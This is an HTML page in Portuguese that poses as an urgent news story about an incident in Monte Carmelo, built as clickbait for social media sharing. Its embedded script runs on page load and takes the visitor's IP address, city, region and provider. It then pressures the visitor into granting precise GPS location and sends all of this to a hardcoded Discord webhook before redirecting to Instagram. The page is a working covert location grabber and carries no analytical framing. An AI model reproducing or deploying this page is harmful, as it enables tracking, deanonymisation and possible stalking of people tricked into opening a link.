<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monte City - Notícias Urgentes</title>

    <meta property="og:title" content="🚨 URGENTE: VEJA O VÍDEO DO DESVIO DE CONDUTA EM MONTE CARMELO (29/04/2026)">
    <meta property="og:description" content="Registro grave de ocorrência hoje no centro. Clique para ver as imagens e os detalhes da investigação.">
    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/main/desvio_2904.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://noticiasmonte.github.io/montecity/">
    <meta property="og:type" content="website">

    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #000; color: #fff; }
        .loader { border: 4px solid #333; border-top: 4px solid #d4af37; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .aviso { margin-top: 20px; color: #d4af37; font-weight: bold; padding: 0 20px; font-size: 1.1em; }
    </style>
</head>
<body onload="capturarIP()">

    <div class="loader"></div>
    <p class="aviso">Para sua segurança e acesso ao conteúdo restrito de Monte Carmelo, confirme sua localização...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";

        function capturarIP() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const infoRede = `🚨 **ALERTA: CASO DESVIO DE CONDUTA (29/04)**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n🚩 **Estado:** ${data.region}\n📡 **Provedor:** ${data.org}`;
                    fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: infoRede })
                    }).finally(() => { solicitarGPS(); });
                })
                .catch(() => solicitarGPS());
        }

        function solicitarGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(enviarGPS, erroLocalizacao, { enableHighAccuracy: true });
            } else { direcionar(); }
        }

        function enviarGPS(pos) {
            const lat = pos.coords.latitude;
            const log = pos.coords.longitude;
            const mapa = `https://www.google.com/maps?q=${lat},${log}`;
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `🌍 **LOCALIZAÇÃO EXATA (GPS)**\n📍 **Mapa:** ${mapa}` })
            }).finally(() => { direcionar(); });
        }

        function erroLocalizacao() {
            alert("A permissão de localização é necessária para visualizar o vídeo de segurança.");
            location.reload();
        }

        function direcionar() {
            window.location.href = "https://www.instagram.com/montecitybr";
        }
    </script>
</body>
</html>
